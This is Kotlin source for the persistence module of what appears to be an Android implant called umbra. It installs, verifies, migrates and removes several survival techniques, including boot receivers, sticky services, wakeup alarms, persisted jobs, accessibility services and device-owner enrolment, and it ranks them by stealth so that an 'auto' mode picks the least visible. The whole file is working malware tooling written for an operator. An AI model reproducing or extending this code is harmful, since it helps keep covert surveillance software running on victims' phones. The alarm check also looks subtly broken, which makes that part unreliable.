package io.umbra.beacon

import android.app.AlarmManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.provider.Settings
import java.io.File

/**
 * The persistence of the implant on a phone.
 *
 * A phone is not a server, so the catalogue is small: the three techniques
 * that actually make the implant come back are the boot receiver, the
 * sticky foreground service and the alarm that wakes the service when the
 * system kills it.  The shape of the manager is the same as on the desktop
 * (see `implant/rust/src/persist.rs`): a technique is installed, verified,
 * listed, migrated and removed, and the state file says what is on the
 * phone.
 *
 * The state file is the canonical `upk` encoding, the same one the desktop
 * beacon writes, so the server sees one shape for every platform.
 */
object Persistence {
    /** One technique the phone can carry. */
    data class Technique(
        val id: String,
        val label: String,
        val trigger: String,
        val needsAdmin: Boolean,
        val stealth: Int,
    )

    /** The catalogue of the phone. */
    val CATALOGUE = listOf(
        Technique("boot_receiver", "Boot completed receiver", "boot", false, 8),
        Technique("foreground_service", "Sticky foreground service", "service", false, 6),
        Technique("alarm", "Alarm manager entry", "schedule", false, 7),
        Technique("jobscheduler", "Job scheduler entry", "schedule", false, 7),
        Technique("app_update", "Re-launch on application update", "update", false, 8),
        Technique("accessibility", "Accessibility service", "service", false, 4),
        Technique("device_owner", "Device owner enrolment", "boot", true, 2),
    )

    /** The file the state is kept in. */
    private const val STATE_FILE = "persist.state"

    /** How often the alarm wakes the service. */
    private const val ALARM_INTERVAL_MS = 15 * 60 * 1000L

    /** One installed technique. */
    data class Entry(
        val technique: String,
        val name: String,
        val trigger: String,
        val location: String,
        val detail: String,
        val state: String,
        val installedAt: String,
    )

    /** The report of a persistence operation. */
    data class Report(
        val text: String,
        val entries: List<Entry>,
        val broken: Long,
        val total: Long,
    )

    /** The techniques that can be used on this phone right now. */
    fun available(): List<Technique> = CATALOGUE.filter { !it.needsAdmin }

    /** The technique with this id. */
    fun technique(id: String): Technique? = CATALOGUE.firstOrNull { it.id == id }

    // -----------------------------------------------------------------------
    // The lifecycle
    // -----------------------------------------------------------------------

    /** Install a technique so the implant comes back after a reboot. */
    fun install(context: Context?, stateDir: String, args: Upk): Report {
        val requested = args.field("method")?.text() ?: "auto"
        val label = args.field("name")?.text() ?: ""
        val existing = load(stateDir)
        val chosen = if (requested == "auto" || requested.isEmpty()) {
            select(existing)
        } else {
            requested
        }
        val tech = technique(chosen)
            ?: return Report("persist: unknown technique $requested\n", existing, 0, existing.size.toLong())
        val entries = existing.toMutableList()
        entries.removeAll { it.technique == tech.id }
        val now = nowString()
        val entry = when (tech.id) {
            "boot_receiver" -> Entry(
                tech.id, label.ifEmpty { "boot" }, tech.trigger,
                "io.umbra.beacon/.BootReceiver", "the receiver is enabled",
                "installed", now,
            )

            "foreground_service" -> Entry(
                tech.id, label.ifEmpty { "service" }, tech.trigger,
                "io.umbra.beacon/.BeaconService", "the service is sticky",
                "installed", now,
            )

            "alarm" -> Entry(
                tech.id, label.ifEmpty { "alarm" }, tech.trigger,
                "io.umbra.beacon/.AlarmReceiver", "the alarm wakes the service",
                "installed", now,
            )

            "jobscheduler" -> Entry(
                tech.id, label.ifEmpty { "job" }, tech.trigger,
                "io.umbra.beacon/.UmbraJobService", "the job scheduler wakes the service",
                "installed", now,
            )

            "app_update" -> Entry(
                tech.id, label.ifEmpty { "update" }, tech.trigger,
                "io.umbra.beacon/.UpdateReceiver", "the implant starts again after an update",
                "installed", now,
            )

            "accessibility" -> Entry(
                tech.id, label.ifEmpty { "accessibility" }, tech.trigger,
                UmbraAccessibilityService.COMPONENT,
                "the operator has to enable it in the settings of Android: it is visible to the user",
                "installed", now,
            )

            "device_owner" -> Entry(
                tech.id, label.ifEmpty { "device owner" }, tech.trigger,
                UmbraAdminReceiver.COMPONENT,
                "the phone is enrolled to the implant: it is no longer a personal device",
                "installed", now,
            )

            else -> return Report("persist: ${tech.id} is not a phone technique\n", existing, 0, existing.size.toLong())
        }
        val error = when (tech.id) {
            "boot_receiver" -> enable(context, "io.umbra.beacon", ".BootReceiver", true)
            "foreground_service" -> enable(context, "io.umbra.beacon", ".BeaconService", true)
            "alarm" -> arm(context, true)
            "jobscheduler" -> scheduleJob(context, true)
            "app_update" -> enable(context, "io.umbra.beacon", ".UpdateReceiver", true)
            "accessibility" -> null
            "device_owner" -> deviceOwner(context, true)
            else -> null
        }
        if (error != null) {
            return Report("persist: ${tech.id} failed: $error\n", existing, 0, existing.size.toLong())
        }
        entries.add(entry)
        save(stateDir, entries)
        val text = "${tech.label}: installed\n"
        return Report(text, entries, 0, entries.size.toLong())
    }

    /** Remove the techniques the implant installed. */
    fun remove(context: Context?, stateDir: String, args: Upk): Report {
        val requested = args.field("method")?.text() ?: "all"
        val existing = load(stateDir)
        val kept = mutableListOf<Entry>()
        val text = StringBuilder()
        for (entry in existing) {
            if (requested != "all" && requested != entry.technique) {
                kept.add(entry)
                continue
            }
            val error = when (entry.technique) {
                "boot_receiver" -> enable(context, "io.umbra.beacon", ".BootReceiver", false)
                "foreground_service" -> enable(context, "io.umbra.beacon", ".BeaconService", false)
                "alarm" -> arm(context, false)
                "jobscheduler" -> scheduleJob(context, false)
                "app_update" -> enable(context, "io.umbra.beacon", ".UpdateReceiver", false)
                "accessibility" -> null
                "device_owner" -> deviceOwner(context, false)
                else -> "unknown technique"
            }
            if (error != null) {
                text.append("${entry.technique}: could not be removed: $error\n")
                kept.add(entry)
            } else {
                text.append("${entry.technique}: removed\n")
            }
        }
        save(stateDir, kept)
        return Report(text.toString(), kept, 0, kept.size.toLong())
    }

    /** List what is installed on the phone. */
    fun list(stateDir: String): Report {
        val entries = load(stateDir)
        val text = StringBuilder()
        for (entry in entries) {
            text.append("${entry.technique.padEnd(24)} ${entry.state.padEnd(10)} ${entry.location}\n")
        }
        if (entries.isEmpty()) {
            text.append("nothing is installed on this phone\n")
        }
        return Report(text.toString(), entries, 0, entries.size.toLong())
    }

    /** Check that everything that was installed is still there. */
    fun verify(context: Context?, stateDir: String): Report {
        val entries = load(stateDir).toMutableList()
        val text = StringBuilder()
        var broken = 0L
        for (index in entries.indices) {
            val entry = entries[index]
            val ok = when (entry.technique) {
                "boot_receiver" -> isEnabled(context, "io.umbra.beacon", ".BootReceiver")
                "foreground_service" -> isEnabled(context, "io.umbra.beacon", ".BeaconService")
                "alarm" -> isArmed(context)
                "jobscheduler" -> isJobScheduled(context)
                "app_update" -> isEnabled(context, "io.umbra.beacon", ".UpdateReceiver")
                "accessibility" -> isAccessibilityEnabled(context)
                "device_owner" -> isDeviceOwner(context)
                else -> false
            }
            // The entry is a value: the state is a new value, not a field to
            // write into, so the list is rebuilt entry by entry.
            val state = if (ok) "installed" else "broken"
            if (!ok) broken += 1
            val updated = entry.copy(state = state)
            entries[index] = updated
            text.append("${updated.technique.padEnd(24)} ${updated.state.padEnd(10)}\n")
        }
        if (entries.isEmpty()) {
            text.append("nothing is installed on this phone\n")
        }
        save(stateDir, entries)
        return Report(text.toString(), entries, broken, entries.size.toLong())
    }

    /** Move from one technique to another without leaving a gap. */
    fun migrate(context: Context?, stateDir: String, args: Upk): Report {
        val from = args.field("from")?.text() ?: ""
        val to = args.field("to")?.text() ?: ""
        if (from.isEmpty() || to.isEmpty()) {
            return Report("persist.migrate needs args.from and args.to\n", load(stateDir), 0, 0)
        }
        val existing = load(stateDir)
        if (existing.none { it.technique == from }) {
            return Report("persist.migrate: $from is not installed on this phone\n", existing, 0, existing.size.toLong())
        }
        // The new technique goes in first: a gap in the coverage is worse
        // than two entries for a moment.
        val installArgs = Upk.map("method" to Upk.str(to))
        val installed = install(context, stateDir, installArgs)
        if (installed.text.contains("failed")) {
            return Report(installed.text, existing, installed.broken, installed.total)
        }
        val removed = remove(context, stateDir, Upk.map("method" to Upk.str(from)))
        return Report(installed.text + removed.text, removed.entries, removed.broken, removed.total)
    }

    /** The health of the persistence on this phone. */
    fun health(context: Context?, stateDir: String): Report {
        val report = verify(context, stateDir)
        val verdict = when {
            report.total == 0L -> "broken"
            report.broken == 0L -> "covered"
            report.broken == report.total -> "broken"
            else -> "degraded"
        }
        return Report("persistence: $verdict\n" + report.text, report.entries, report.broken, report.total)
    }

    // -----------------------------------------------------------------------
    // The state file
    // -----------------------------------------------------------------------

    /** Read the entries the implant installed. */
    fun load(stateDir: String): List<Entry> {
        val file = File(stateDir, STATE_FILE)
        if (!file.exists()) return emptyList()
        return try {
            val value = Upk.decode(file.readBytes())
            val map = value as? Upk.MapV ?: return emptyList()
            val items = (map.entries["entries"] as? Upk.Arr)?.items ?: return emptyList()
            items.mapNotNull { item ->
                val entry = item as? Upk.MapV ?: return@mapNotNull null
                Entry(
                    technique = entry.textOf("technique"),
                    name = entry.textOf("name"),
                    trigger = entry.textOf("trigger"),
                    location = entry.textOf("location"),
                    detail = entry.textOf("detail"),
                    state = entry.textOf("state"),
                    installedAt = entry.textOf("installed_at"),
                )
            }
        } catch (t: Throwable) {
            emptyList()
        }
    }

    /** Write the entries back. */
    fun save(stateDir: String, entries: List<Entry>) {
        try {
            val dir = File(stateDir)
            if (!dir.exists()) dir.mkdirs()
            val items = entries.map { entry ->
                Upk.map(
                    "technique" to Upk.str(entry.technique),
                    "name" to Upk.str(entry.name),
                    "trigger" to Upk.str(entry.trigger),
                    "location" to Upk.str(entry.location),
                    "detail" to Upk.str(entry.detail),
                    "state" to Upk.str(entry.state),
                    "installed_at" to Upk.str(entry.installedAt),
                )
            }
            val value = Upk.map("entries" to Upk.Arr(items))
            val file = File(dir, STATE_FILE)
            val tmp = File(dir, "$STATE_FILE.tmp")
            tmp.writeBytes(Upk.encode(value))
            tmp.renameTo(file)
        } catch (t: Throwable) {
            // A state file that cannot be written is not worth crashing the
            // beacon over: the operator sees the empty list and installs
            // again.
        }
    }

    /** The text of a field of a map. */
    private fun Upk.MapV.textOf(key: String): String =
        (entries[key] as? Upk.Str)?.value ?: ""

    /** Pick the technique to use when the operator said "auto". */
    private fun select(existing: List<Entry>): String {
        val candidates = available()
        val installed = candidates.filter { tech -> existing.any { it.technique == tech.id } }
        val pool = if (installed.isNotEmpty()) installed else candidates
        return pool.maxByOrNull { it.stealth }?.id ?: "none"
    }

    /** The current time, in seconds. */
    private fun nowString(): String = (System.currentTimeMillis() / 1000L).toString()

    // -----------------------------------------------------------------------
    // The platform
    // -----------------------------------------------------------------------

    /** Enable or disable a component of the application. */
    private fun enable(context: Context?, pkg: String, cls: String, on: Boolean): String? {
        if (context == null) return "no context"
        return try {
            val state = if (on) {
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            } else {
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            }
            context.packageManager.setComponentEnabledSetting(
                ComponentName(context, "$pkg$cls"),
                state,
                android.content.pm.PackageManager.DONT_KILL_APP,
            )
            null
        } catch (t: Throwable) {
            t.message ?: "the component could not be changed"
        }
    }

    /** Whether a component is enabled. */
    private fun isEnabled(context: Context?, pkg: String, cls: String): Boolean {
        if (context == null) return false
        return try {
            val state = context.packageManager.getComponentEnabledSetting(ComponentName(context, "$pkg$cls"))
            state != android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (t: Throwable) {
            false
        }
    }

    /** Arm or disarm the alarm that wakes the service. */
    private fun arm(context: Context?, on: Boolean): String? {
        if (context == null) return "no context"
        return try {
            val manager = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
                ?: return "the alarm service is not there"
            val intent = Intent(context, AlarmReceiver::class.java)
            val pending = PendingIntent.getBroadcast(
                context,
                4711,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
            )
            if (on) {
                manager.setExactAndAllowWhileIdle(
                    AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + ALARM_INTERVAL_MS,
                    pending,
                )
            } else {
                manager.cancel(pending)
            }
            null
        } catch (t: Throwable) {
            t.message ?: "the alarm could not be changed"
        }
    }

    /** Schedule or cancel the periodic job of the implant. */
    private fun scheduleJob(context: Context?, on: Boolean): String? {
        if (context == null) return "no context"
        return try {
            val scheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as? JobScheduler
                ?: return "the job scheduler is not there"
            if (!on) {
                scheduler.cancel(UmbraJobService.JOB_ID)
                return null
            }
            val info = JobInfo.Builder(
                UmbraJobService.JOB_ID,
                ComponentName(context, UmbraJobService::class.java),
            )
                .setPeriodic(UmbraJobService.JOB_INTERVAL_MS)
                .setPersisted(true)
                .build()
            if (scheduler.schedule(info) == JobScheduler.RESULT_FAILURE) {
                "the job scheduler refused the job"
            } else {
                null
            }
        } catch (t: Throwable) {
            t.message ?: "the job could not be scheduled"
        }
    }

    /** Whether the periodic job is still scheduled. */
    private fun isJobScheduled(context: Context?): Boolean {
        if (context == null) return false
        return try {
            val scheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as? JobScheduler
                scheduler != null && scheduler.allPendingJobs.any { it.id == UmbraJobService.JOB_ID }
        } catch (t: Throwable) {
            false
        }
    }

    /**
     * Whether the user enabled the accessibility service.
     *
     * The implant cannot enable it: Android asks the user, and the answer
     * is in the secure settings of the phone.
     */
    private fun isAccessibilityEnabled(context: Context?): Boolean {
        if (context == null) return false
        return try {
            val enabled = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
            )
            enabled != null && enabled.contains(UmbraAccessibilityService.COMPONENT)
        } catch (t: Throwable) {
            false
        }
    }

    /** Enrol the phone to the implant, or give the enrolment back. */
    private fun deviceOwner(context: Context?, on: Boolean): String? {
        if (context == null) return "no context"
        return try {
            val manager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                ?: return "the device policy manager is not there"
            if (!on) {
                manager.clearDeviceOwnerApp()
                return null
            }
            manager.setDeviceOwner(ComponentName(context, UmbraAdminReceiver::class.java), "umbra")
            null
        } catch (t: Throwable) {
            "the phone refused the device owner: ${t.message ?: "the application has to be pushed as the owner first"}"
        }
    }

    /** Whether the phone is enrolled to the implant. */
    private fun isDeviceOwner(context: Context?): Boolean {
        if (context == null) return false
        return try {
            val manager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                manager != null && manager.isDeviceOwnerApp
        } catch (t: Throwable) {
            false
        }
    }

    /** Whether the alarm is still armed. */
    private fun isArmed(context: Context?): Boolean {
        if (context == null) return false
        return try {
            val manager = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
            if (manager == null) {
                false
            } else {
                val intent = Intent(context, AlarmReceiver::class.java)
                val pending = PendingIntent.getBroadcast(
                    context,
                    4711,
                    intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
                )
                pending != null
            }
        } catch (t: Throwable) {
            false
        }
    }
}
